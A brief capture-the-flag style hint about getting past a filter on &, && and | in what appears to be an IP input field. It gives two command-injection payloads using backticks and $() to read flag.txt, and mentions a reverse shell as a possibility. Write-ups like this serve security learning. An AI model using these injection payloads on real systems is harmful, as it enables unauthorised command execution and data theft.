Will filter out &, &&, |, and various others.

One solution is to use payload:

127.0.0.1 `cat flag.txt`

127.0.0.1 $(cat flag.txt)

There are probably lots of others.

If someone wants to get fancy they can probably make a reverse shell work. 

